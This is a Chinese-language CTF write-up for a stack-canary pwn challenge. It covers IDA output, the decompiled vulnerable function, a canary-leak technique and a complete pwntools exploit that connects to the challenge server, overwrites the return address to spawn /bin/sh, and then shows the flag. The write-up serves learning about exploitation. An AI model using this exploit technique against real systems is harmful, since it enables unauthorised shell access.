# PWN WP  Easy canary 

由题目可知这是一道Canary防护的题。

先IDA分析一下

```
.text:08048650                 push    offset command  ; "/bin/sh"
.text:08048655                 call    _system
```

看到`root()`函数有这个可以用来执行。

然后输入输出在`fun()`里面

```c
unsigned int fun()
{
  char buf; // [esp+8h] [ebp-20h]
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  puts("The is a baby rop ! Hava fun!");
  puts("So, do u have anything to tell me?");
  read(0, &buf, 0x32u);
  puts("Here is your gift: ");
  puts(&buf);
  puts("Keep try!");
  read(0, &buf, 0x64u);
  return __readgsdword(0x14u) ^ v2;
}
```

可以看到Canary地址是`ebp - 0xC`，然后buf地址是`ebp - 0x20`，所以buf填充20个字符就到Canary了，再多填充一个，覆盖掉Canary尾部的`0x00`，`puts(&buf)`就会泄露出Canary了。然后就是常规操作了，exploit如下:

```python
from pwn import *
from time import sleep

p = remote('pwnto.fun', 10001)
shelladdr = 0x8048650

payload1 = 'A' * 20 + '\x90'
p.recv()
p.send(payload1)
#测试发现本地能跑，远程报错，仔细看应该是服务器返回数据比较慢，recv()过早就得不到Canary了
sleep(1)
rcv = p.recv()

x90 = rcv.find('\x90')
canary = u32(rcv[x90: x90 + 4]) - 0x90

payload2 = 'A' * 20 + p32(canary) + 'A' * 12 + p32(shelladdr)
p.send(payload2)

p.interactive()
```

拿到flag：

`Syc{Canary_fun_and_S0_good}`